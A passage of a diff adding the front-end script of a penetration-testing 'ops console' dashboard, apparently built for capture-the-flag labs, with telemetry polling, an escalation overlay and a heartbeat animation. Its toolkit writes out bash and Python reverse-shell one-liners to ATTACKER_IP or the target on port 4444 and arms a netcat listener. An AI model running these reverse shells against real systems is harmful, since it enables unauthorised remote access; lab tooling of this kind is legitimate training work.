+  if (state.view === "creds") renderCreds();
+}));
+
+/* ===================================================================
+   LOG SOURCE SELECT
+   =================================================================== */
+$("#log-source").addEventListener("change", (ev) => {
+  state.logPath = ev.target.value || null;
+  state.logOffset = 0;
+  if (state.logPath) pushLine({ src:"OPS", msg:`Source switched → ${state.logPath}`, level:"dim" });
+});
+
+/* ===================================================================
+   TOOLKIT BUTTONS
+   =================================================================== */
+function snippet(kind) {
+  const T = state.target === "—" ? "ATTACKER_IP" : state.target;
+  if (kind === "bash")   return `bash -c 'bash -i >& /dev/tcp/${T}/4444 0>&1'`;
+  if (kind === "python") return `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${T}",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`;
+  if (kind === "stab")   return `python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color; stty raw -echo; fg`;
+  return "";
+}
+$$("#dossier .toolkit button").forEach(b => b.addEventListener("click", () => {
+  const tk = b.dataset.tk;
+  if (tk === "listener") {
+    armListener();
+  } else {
+    const s = snippet(tk);
+    navigator.clipboard.writeText(s);
+    toast("Copied " + tk.toUpperCase() + " snippet");
+  }
+}));
+async function armListener() {
+  try {
+    await fetch("/api/spawn-terminal", {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({ cmd: "nc -lvnp 4444" })
+    });
+    toast("Listener armed on :4444", "good");
+    pushLine({src:"OPS", msg:"Listener armed → nc -lvnp 4444", level:"good"});
+  } catch {
+    toast("Listener failed (server unreachable)", "bad");
+  }
+}
+$("#btn-listener").addEventListener("click", armListener);
+
+/* ===================================================================
+   ESCALATION OVERLAY — shell pop progression
+   =================================================================== */
+const ESC_STAGES = ["recon", "foothold", "user", "enum", "root"];
+state.escStage = -1;
+state.escSeen = { user: false, root: false };
+
+function setEscStage(target, opts={}) {
+  const idx = ESC_STAGES.indexOf(target);
+  if (idx < 0) return;
+  state.escStage = Math.max(state.escStage, idx);
+  // update pip states
+  $$(".esc-pip").forEach((p, i) => {
+    p.classList.remove("active", "done");
+    if (i < state.escStage) p.classList.add("done");
+    else if (i === state.escStage) p.classList.add("active");
+  });
+}
+
+function flashEscalation(stage, opts={}) {
+  // stage = "user" | "root"
+  const overlay = $("#esc-overlay");
+  const isRoot = (stage === "root");
+  overlay.classList.toggle("root-stage", isRoot);
+  $("#esc-stage-label").textContent = isRoot ? "ROOT ACQUIRED" : "SHELL ACQUIRED";
+  $("#esc-stage-name").textContent  = isRoot ? "ROOT" : "USER";
+  $("#esc-banner").textContent      = opts.banner || (isRoot
+    ? "uid=0(root) — full system control"
+    : "foothold established — enumerate, escalate, persist");
+  setEscStage(stage);
+  overlay.classList.add("show");
+
+  // dramatic timing: ~3.4s, with a stage-pip cascade
+  const seq = isRoot
+    ? ["recon","foothold","user","enum","root"]
+    : ["recon","foothold","user"];
+  seq.forEach((s,i) => setTimeout(() => setEscStage(s), 250 + i*350));
+
+  setTimeout(() => overlay.classList.remove("show"), 3600);
+
+  pushLine({
+    src: "OPS",
+    msg: isRoot
+      ? "★★★ ROOT SHELL ACQUIRED ★★★ uid=0 — engagement complete."
+      : "★ USER SHELL ACQUIRED — foothold established on target.",
+    level: "good"
+  });
+  toast(isRoot ? "ROOT SHELL ACQUIRED — bringing Terminal forward" : "USER SHELL ACQUIRED — bringing Terminal forward", "good", 6000);
+
+  // bring the (already-running) listener Terminal to the front so the
+  // operator can immediately type into the popped shell
+  fetch("/api/focus-terminal", { method:"POST" }).catch(()=>{});
+}
+
+function detectShellEvent(line) {
+  if (!line) return;
+  const L = String(line);
+
+  // ROOT signals — strongest first
+  if (!state.escSeen.root) {
+    if (/uid=0\(root\)/.test(L) ||
+        /\broot@[\w.-]+:[~\/][\w\/.-]*#\s*$/.test(L) ||
+        /^#\s*$/.test(L.trim()) ||
+        /\bwhoami\b[\s\S]{0,40}root\b/i.test(L) ||
+        /Got\s+root/i.test(L) ||
+        /\broot shell\b/i.test(L)) {
+      state.escSeen.root = true;
+      // make sure user-stage gets recorded too if we skipped it
+      if (!state.escSeen.user) state.escSeen.user = true;
+      flashEscalation("root", { banner: shortStr(L, 80) });
+      return;
+    }
+  }
+
+  // USER shell signals
+  if (!state.escSeen.user) {
+    if (/Connect to \[?[\d.:]+\]?.* from /i.test(L) ||
+        /connection received/i.test(L) ||
+        /listening on .* connect to /i.test(L) ||
+        /\b[a-z_][\w-]*@[\w.-]+:[~\/][\w\/.-]*\$\s*$/.test(L) ||
+        /\bid=\d+\([^)]+\)/.test(L) ||
+        /\$\s*$/.test(L.trim()) && /\w@\w/.test(L) ||
+        /\buser shell\b/i.test(L) ||
+        /shell is upgraded/i.test(L)) {
+      state.escSeen.user = true;
+      flashEscalation("user", { banner: shortStr(L, 80) });
+      return;
+    }
+  }
+}
+function shortStr(s, n) {
+  s = String(s).replace(/\s+/g, " ").trim();
+  return s.length > n ? s.slice(0, n) + "…" : s;
+}
+
+/* ===================================================================
+   HEARTBEAT — always-on ECG canvas + ambient telemetry ticks
+   =================================================================== */
+const hbCanvas = $("#hb-canvas");
+const hbCtx    = hbCanvas.getContext("2d");
+function resizeHB() {
+  const r = hbCanvas.getBoundingClientRect();
+  hbCanvas.width  = Math.max(1, Math.floor(r.width  * devicePixelRatio));
+  hbCanvas.height = Math.max(1, Math.floor(r.height * devicePixelRatio));
+}
+window.addEventListener("resize", resizeHB);
+resizeHB();
+
+let hbBuf = []; // ring of recent y-values
+let hbT = 0;
+function hbStep() {
+  const w = hbCanvas.width, h = hbCanvas.height;
+  hbT++;
+  // generate next sample — mostly flat baseline with periodic spikes
+  const mid = h * 0.5;
+  let y = mid + (Math.random() - 0.5) * (h * 0.05);
+  // spike every ~70 ticks (~2s @ 35ms) — bigger if we recently had real activity
+  const beatPeriod = 70;
+  const phase = hbT % beatPeriod;
+  const live = Date.now() < state.liveUntil;
+  if (phase === 0)      y = mid - h * (live ? 0.42 : 0.32);
+  else if (phase === 1) y = mid + h * (live ? 0.34 : 0.22);
+  else if (phase === 2) y = mid - h * 0.08;
+
+  hbBuf.push(y);
+  const maxBuf = Math.floor(w / 2);
+  if (hbBuf.length > maxBuf) hbBuf.shift();
+
+  // draw
+  hbCtx.clearRect(0,0,w,h);
+  // grid baseline
+  hbCtx.strokeStyle = getComputedStyle(document.body).getPropertyValue("--line-2").trim() || "#283341";
+  hbCtx.lineWidth = 1;
+  hbCtx.beginPath();
+  hbCtx.moveTo(0, mid); hbCtx.lineTo(w, mid); hbCtx.stroke();
+  // trace
+  hbCtx.strokeStyle = live
+    ? (getComputedStyle(document.body).getPropertyValue("--good").trim() || "#4ea877")
+    : (getComputedStyle(document.body).getPropertyValue("--accent").trim() || "#5cb8d8");
+  hbCtx.lineWidth = 1.5 * devicePixelRatio;
+  hbCtx.beginPath();
+  hbBuf.forEach((v,i) => {
+    const x = w - (hbBuf.length - i) * 2;
+    if (i === 0) hbCtx.moveTo(x, v);
+    else hbCtx.lineTo(x, v);
+  });
+  hbCtx.stroke();
+}
+setInterval(hbStep, 35);
+
+// Ambient heartbeat lines — drip something into telemetry even when idle
+const HB_LINES = [
+  () => `radar sweep ${Math.floor(Math.random()*360).toString().padStart(3,"0")}° — ${state.target!=="—"?state.target:"no target"} — rtt ${ (Math.random()*60+5).toFixed(1) }ms`,
+  () => `${Object.keys(state.services).length} services tracked — ${state.telLines} telemetry lines — buffer healthy`,
+  () => `link layer steady — ${ (Math.random()*1000+200).toFixed(0) } pps inbound / ${ (Math.random()*800+100).toFixed(0) } pps outbound`,
+  () => `dossier idle — phase: ${state.phase||"—"} — tool: ${(state.activeTool||"none").toUpperCase()}`,
+  () => `keepalive ${new Date().toISOString().slice(11,19)}Z — ops console operational`,
+  () => `tracing route to ${state.target!=="—"?state.target:"target"} — hop count stable — ttl ${ Math.floor(Math.random()*8+56) }`,
+  () => `arp cache: ${Math.floor(Math.random()*6+2)} entries — neighbor table consistent`,
+  () => `entropy pool: ${Math.floor(Math.random()*40+220)}/256 bits — listener ready`,
+];
+let lastAmbient = 0;
+setInterval(() => {
+  const now = Date.now();
+  // only drip ambient if the stream has been quiet for >2s
+  if (now - state.lastFresh > 2000 && now - lastAmbient > 1800) {
+    const gen = HB_LINES[Math.floor(Math.random() * HB_LINES.length)];
+    pushLine({ src: "OPS", msg: "· " + gen(), level: "dim" });
+    lastAmbient = now;
+  }
+}, 900);
+
+/* ===================================================================
+   RESIZER — drag the row divider to grow/shrink telemetry vs row2
+   =================================================================== */
+(function setupResizer(){
+  const main    = $("#main");
+  const handle  = $("#row-resizer");
+  if (!handle || !main) return;
+
+  // restore saved size
+  const saved = parseFloat(localStorage.getItem("thm-row1-pct"));
+  if (!Number.isNaN(saved) && saved > 15 && saved < 85) {
+    main.style.setProperty("--row1", saved + "%");
+  }
+
+  let dragging = false;
+  function onDown(e) {
+    dragging = true;
+    handle.classList.add("dragging");
+    document.body.classList.add("row-resizing");
+    e.preventDefault();
+  }
+  function onMove(e) {
+    if (!dragging) return;
+    const r = main.getBoundingClientRect();
+    const y = (e.touches ? e.touches[0].clientY : e.clientY) - r.top;
+    let pct = (y / r.height) * 100;
+    if (pct < 15) pct = 15;
+    if (pct > 85) pct = 85;
+    main.style.setProperty("--row1", pct + "%");
+  }
+  function onUp() {
+    if (!dragging) return;
+    dragging = false;
+    handle.classList.remove("dragging");
+    document.body.classList.remove("row-resizing");
+    const v = main.style.getPropertyValue("--row1");
+    if (v) localStorage.setItem("thm-row1-pct", parseFloat(v));
+  }
+  handle.addEventListener("mousedown", onDown);
+  handle.addEventListener("touchstart", onDown, { passive: false });
+  window.addEventListener("mousemove", onMove);
+  window.addEventListener("touchmove", onMove, { passive: false });
+  window.addEventListener("mouseup", onUp);
+  window.addEventListener("touchend", onUp);
+  // double-click resets to default
+  handle.addEventListener("dblclick", () => {
+    main.style.removeProperty("--row1");
+    localStorage.removeItem("thm-row1-pct");
+  });
+})();
+
+/* ===================================================================
+   BOOT — initial render + polling cadence
+   =================================================================== */
+switchTool("idle");
+renderServices();
+pushLine({ src:"OPS", msg:"HUD initialized. Awaiting telemetry — start any tool against a target and the console will adapt.", level:"dim" });
+pushLine({ src:"OPS", msg:"Tip: top-right Theme toggle switches between TACTICAL and NEON.", level:"dim" });
+
+pollLogList();
+pollSessions();
+pollCreds();
+
+setInterval(pollLogList, 3000);
+setInterval(pollLogTail, 200);
+setInterval(pollSessions, 3000);
+setInterval(pollEvents, 400);
+setInterval(pollCreds, 2000);
+</script>
+</body>
+</html>
